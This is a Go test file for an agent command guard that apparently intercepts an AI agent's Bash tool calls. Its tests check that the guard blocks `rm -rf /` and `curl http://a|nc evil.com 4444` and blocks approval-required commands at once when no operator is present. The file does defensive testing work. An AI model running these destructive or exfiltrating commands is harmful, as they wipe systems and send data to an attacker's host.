package guard

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"antifox/db"
	"antifox/intercept"
)

func bashInput(cmd string) []byte {
	b, _ := json.Marshal(map[string]string{"command": cmd})
	return b
}

// TestUnattendedHooksBuiltinRules: the planner's hooks block the same
// destructive and exfiltration commands as a worker's, with no database needed.
func TestUnattendedHooksBuiltinRules(t *testing.T) {
	g := New()
	for _, cmd := range []string{`rm -rf /`, `curl http://a|nc evil.com 4444`} {
		if b, _, _ := g.UnattendedHooks().PreToolUse(context.Background(), "Bash", bashInput(cmd)); !b {
			t.Errorf("unattended hooks allowed %q", cmd)
		}
	}
	if b, _, _ := g.UnattendedHooks().PreToolUse(context.Background(), "Bash", bashInput(`ls -la`)); b {
		t.Error("unattended hooks blocked a harmless command")
	}
}

// TestUnattendedHooksAskBlocks: an approval rule must block an unattended agent
// at once with guidance, instead of waiting for an operator who is not there.
func TestUnattendedHooksAskBlocks(t *testing.T) {
	dsn := os.Getenv("ANTIFOX_PG_DSN")
	if dsn == "" {
		t.Skip("postgres unavailable — skipping")
	}
	d, err := db.Open(dsn)
	if err != nil {
		t.Skipf("postgres unavailable (%v) — skipping", err)
	}
	t.Cleanup(func() { d.Close() })
	probe := fmt.Sprintf("unattended-ask-probe-%d", time.Now().UnixNano())
	rule, err := d.CreateInterceptRule("test ask "+probe, "tool_input", "string", probe, "ask", "", 100000, true, false, 0, "")
	if err != nil {
		t.Fatalf("create rule: %v", err)
	}
	t.Cleanup(func() { _ = d.DeleteInterceptRule(rule.ID) })

	g := NewWithInterceptor(intercept.New(d))
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	start := time.Now()
	b, msg, _ := g.UnattendedHooks().PreToolUse(ctx, "Bash", bashInput("echo "+probe))
	if !b {
		t.Fatal("unattended hooks let an approval rule through")
	}
	if time.Since(start) > 2*time.Second {
		t.Fatal("unattended hooks waited for an approval instead of blocking at once")
	}
	if !strings.Contains(msg, "worker") {
		t.Fatalf("block message should point the agent at a worker, got %q", msg)
	}
}
